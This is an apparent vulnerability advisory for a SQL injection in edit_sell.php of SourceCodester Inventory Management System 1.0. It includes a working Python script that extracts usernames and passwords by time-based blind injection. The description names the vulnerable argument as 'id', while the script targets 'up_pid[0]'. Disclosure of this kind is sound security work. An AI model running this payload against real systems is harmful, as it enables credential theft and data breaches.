# SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in edit_sell.php
## Software

- Software: Inventory Management System 1.0
- Software Link: https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description

A vulnerability has been found in SourceCodester Inventory Management System 1.0 and classified as critical. SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in edit_sell.php. Affected is file edit_sell.php, the manipulation of the argument id leads to SQL injection. Remote attackers can exploit SQL time-based blind injection to retrieve all data from the database.

## Vulnerability Code

- app/action/edit_sell.php
- 
![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/8ac8ea3d-75c7-4da9-8d9a-2d8780a784f5)


## POC
```python
import time 
import requests
import string 

dict = string.digits + string.ascii_lowercase + string.punctuation
res = ""
dealy = 2

for i in range(1,50):
    for j in dict:
        start = time.time()
        # payload = {"up_pid[0]":'1 and if(substr(database(),%s,1)="%s",sleep(2),1)' % (i,j)}
        payload = {"up_pid[0]":'1 and if(substr((select group_concat(username,password) from user),%s,1)="%s",sleep(2),1)' % (i,j)}
        req = requests.post("http://localhost/app/action/edit_sell.php", data=payload)
        end = time.time() - start
        if end > dealy:
            res += j
            print('[*] Found:' + res)
            break
```

![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/c6c0bd7b-e7ce-4ba2-b800-726bb2edf2b0)
